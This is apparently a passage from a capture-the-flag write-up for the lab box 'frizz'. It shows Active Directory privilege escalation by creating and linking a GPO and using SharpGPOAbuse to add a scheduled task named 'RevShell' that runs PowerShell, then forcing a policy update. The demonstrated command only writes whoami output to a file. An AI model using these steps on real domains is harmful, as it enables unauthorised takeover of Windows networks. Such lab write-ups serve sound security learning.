## SharpGPOAbuse

SharpGPOAbuse.exe requires a “vulnerable” (writable) GPO. There are two GPOs on the domain:

```bash
PS C:\> Get-GPO -all
```

If you don't want to mess with these, create your own

```bash
New-GPO -name "0xdf"
```

then link it to this computer:

```bash
New-GPLink -Name "0xdf" -target "DC=frizz,DC=htb"
```

```bash
PS C:\> \windows\temp\SharpGPOAbuse.exe --addcomputertask --GPOName "0xdf" --Author "0xdf" --TaskName "RevShell" --Command "powershell.exe" --Arguments "whoami > \users\m.schoolbus\test"
```

then

```bash
gpupdate /force
```

to update
